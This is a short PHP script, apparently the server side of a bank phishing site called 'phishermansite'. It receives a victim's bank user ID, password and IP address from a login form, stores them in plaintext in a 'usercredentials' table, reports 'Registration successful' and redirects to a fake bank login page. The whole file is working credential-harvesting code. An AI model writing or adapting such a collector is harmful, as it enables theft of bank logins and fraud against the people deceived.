<?php
    $BankUID = $_POST['BankUID'];
    $Password = $_POST['Password'];
    $ipaddr = $_POST['ipaddr'];

    // Database connection
    $conn = new mysqli('localhost', 'root', '', 'phishermansite');
    if ($conn->connect_error) {
        die('Connection Failed : ' . $conn->connect_error);
    } else {
        $stmt = $conn->prepare("INSERT INTO usercredentials (BankUID, Password, ipaddr) VALUES (?, ?, ?)");
        $stmt->bind_param("sss", $BankUID, $Password, $ipaddr);
        $stmt->execute();
        echo "Registration successful";
        $stmt->close();
        $conn->close();
        header("Location: http://localhost/phishermansite/BankLoginPage.php");
        exit;
    }
        
?>
    